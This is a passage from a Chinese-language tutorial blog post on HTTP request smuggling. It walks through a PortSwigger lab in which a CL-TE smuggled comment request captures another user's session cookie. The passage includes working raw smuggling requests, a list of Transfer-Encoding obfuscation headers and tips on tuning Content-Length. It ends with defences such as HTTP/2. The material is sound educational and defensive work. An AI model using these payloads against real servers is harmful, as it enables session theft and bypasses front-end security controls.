    Content-Type: application/x-www-form-urlencoded
    Content-length: 4
    Transfer-Encoding[空格]: chunked
    5c
    GPOST / HTTP/1.1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 15
    x=1
    0
    [空白行]
    [空白行]
PortSwigger 给出了一些可用于混淆的 payload：
    Transfer-Encoding: xchunked
    Transfer-Encoding[空格]: chunked
    Transfer-Encoding: chunked
    Transfer-Encoding: x
    Transfer-Encoding:[tab]chunked
    [空格]Transfer-Encoding: chunked
    X: X[\n]Transfer-Encoding: chunked
    Transfer-Encoding
    : chunked
### 其他
以上是 PortSwigger 列举的攻击方式，另外还有 @Regilero 大佬的更多姿势：
  * 
  * 
  * 
## 漏洞利用
PortSwigger 举了一些栗子，懂了上面说的三个走私方式基本就会了：
  * 绕过前置服务器的安全限制
  * 获取前置服务器修改过的请求字段
  * 获取其他用户的请求
  * 反射型 XSS 组合拳
  * 将 on-site 重定向变为开放式重定向
  * 缓存投毒
  * 缓存欺骗
其中有的利用条件是很苛刻的，师傅们已经讲的很清楚了，我就不重复了。实验环境在 [Exploiting HTTP request smuggling
vulnerabilities](https://portswigger.net/web-security/request-smuggling/exploiting)，师傅们的分析在  和
，油管一小哥制作的视频演示
 。
## 实例分析
用一个实验环境来分析：[通过 HTTP 请求走私获取其他用户的请求内容（Exploiting HTTP request smuggling to
capture other users' requests）](https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests) 。
已知可用 `CL-TE` 方式，comment 的内容会显示在网页上，所以攻击者可以尝试走私一个发布评论的请求：
    POST / HTTP/1.1
    Host: ace31f621e3458058060015600db0052.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 325
    Transfer-Encoding: chunked
    0
    POST /post/comment HTTP/1.1
    Host: ace31f621e3458058060015600db0052.web-security-academy.net
    Content-Length: 665
    Content-Type: application/x-www-form-urlencoded
    Cookie: session=dqEjUlzKqlWzKEqYGZjHHnxopBVwXE83
    csrf=w5OK3MzGFJFmISARVohtuyl2WCxYQRgG&postId=3&name=p&email=a%40q.cc&website=http%3A%2F%2Fa.cc&comment=a
前置服务器通过 `Content-Length` 判断这是一个完整的请求，于是全部发到后端服务器。后端识别 `Transfer-Encoding:
chunked` 并截取到 `0\r\n\r\n` 的位置：
    POST / HTTP/1.1
    Host: ace31f621e3458058060015600db0052.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 325
    Transfer-Encoding: chunked
    0
    [空白行]
    [空白行]
认为这是一个完整的请求，进而交由后端应用处理并响应。
此时缓冲区中还剩下的内容是一个发布评论的请求：
    POST /post/comment HTTP/1.1
    Host: ace31f621e3458058060015600db0052.web-security-academy.net
    Content-Length: 665
    Content-Type: application/x-www-form-urlencoded
    Cookie: session=dqEjUlzKqlWzKEqYGZjHHnxopBVwXE83
    csrf=w5OK3MzGFJFmISARVohtuyl2WCxYQRgG&postId=3&name=p&email=a%40q.cc&website=http%3A%2F%2Fa.cc&comment=a
被认为是下一次请求的一部分，于是继续等待剩余请求内容。如果此时有 A 用户发出请求，A 的请求会被拼接到缓冲区已有内容的末尾形成一个完整的请求。也就是说 A
用户的请求被拼接成了如下，作为 comment 的值被后端应用处理了。
    POST /post/comment HTTP/1.1
    Host: ace31f621e3458058060015600db0052.web-security-academy.net
    Content-Length: 665
    Content-Type: application/x-www-form-urlencoded
    Cookie: session=dqEjUlzKqlWzKEqYGZjHHnxopBVwXE83
    csrf=w5OK3MzGFJFmISARVohtuyl2WCxYQRgG&postId=3&name=p&email=a%40q.cc&website=http%3A%2F%2Fa.cc&comment=aGET / HTTP/1.1
    Host: ace31f621e3458058060015600db0052.web-security-academy.net
    Cookie: session=Aut2OpgUu5CETZx284akOcSqrJ5UNlqI
    ....
这样我们就可以在网页上显示 comment 内容的地方看到用户 A 的 HTTP 请求，获取 Cookie 等敏感数据。
这个实验在复现时需要一点运气，后台模拟的受害者不一定什么时候会访问到，而且还要多次试验调整 CL 长度来包含完整的 Cookie。注意 CL
要一点一点加，我是从 400 开始每次加 100，到 700 时出现了未知错误，于是减到 660，出现了一部分 session 内容，再以我自己的
session 长度为标准加到 665，正好包含全部 session 值。
## 防御
>   * 禁用代理服务器与后端服务器之间的 TCP 连接重用
>   * 使用 HTTP/2 协议
>   * 前后端使用相同的服务器
>
>
> 以上的措施有的不能从根本上解决问题，而且有着很多不足，就比如禁用代理服务器和后端服务器之间的 TCP 连接重用，会增大后端服务器的压力。使用
> HTTP/2 在现在的网络条件下根本无法推广使用，哪怕支持 HTTP/2 协议的服务器也会兼容 HTTP/1.1。从本质上来说，HTTP
> 请求走私出现的原因并不是协议设计的问题，而是不同服务器实现的问题，个人认为最好的解决方案就是严格的实现 RFC7230-7235
> 中所规定的的标准，但这也是最难做到的。
对于 HTTP/2 能避免请求走私的原理，根据 @ZeddYu
师傅的[描述](https://blog.zeddyu.info/2019/12/05/HTTP-Smuggling/#Defence)，我去查了一下[HTTP/2
简介](https://developers.google.com/web/fundamentals/performance/http2)，总结一下，HTTP/1.1
的一些特性为请求走私创造了条件：
  1. 纯文本，以换行符作为分隔符
  2. 序列和阻塞机制
而在 HTTP/2 中已经没有了产生请求走私的机会：
  1. 使用 **二进制编码** 且分割为更小的传输单位（帧，拥有编号， **可乱序传输** ）
  2. **同一个来源的所有通信都在一个 TCP 连接上完成** ，此连接可以承载任意数量的双向数据流
> With the new binary framing mechanism in place, HTTP/2 no longer needs
> multiple TCP connections to multiplex streams in parallel; each stream is
> split into many frames, which can be interleaved and prioritized. As a
> result, all HTTP/2 connections are persistent, and only one connection per
> origin is required, which offers numerous performance benefits.
## 后记
啰啰嗦嗦的写完了，其实已经有师傅发过很全面的总结了，本文的目的是填一下自己学习过程中遇到的坑（比如长度计算、pipeline 等），希望读者能通过本文对
HTTP 请求走私有一个基础的认识。
本文是站在师傅们的肩膀上完成的，并且非常感谢 [@ZeddYu](https://xz.aliyun.com/u/12624) 师傅的邮件答疑，给大佬递茶。
相关资料：
  * [Smuggling](https://regilero.github.io/tag/Smuggling/)
  * [一篇文章带你读懂 HTTP Smuggling 攻击](https://blog.zeddyu.info/2019/12/05/HTTP-Smuggling/)
  * [协议层的攻击——HTTP请求走私](https://paper.seebug.org/1048/)
  * [HTTP Desync Attacks: Request Smuggling Reborn](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
  * [Exploiting HTTP request smuggling vulnerabilities](https://portswigger.net/web-security/request-smuggling/exploiting)
  * [HTTP pipelining](https://en.wikipedia.org/wiki/HTTP_pipelining)
  * [HTTP/2 简介](https://developers.google.com/web/fundamentals/performance/http2)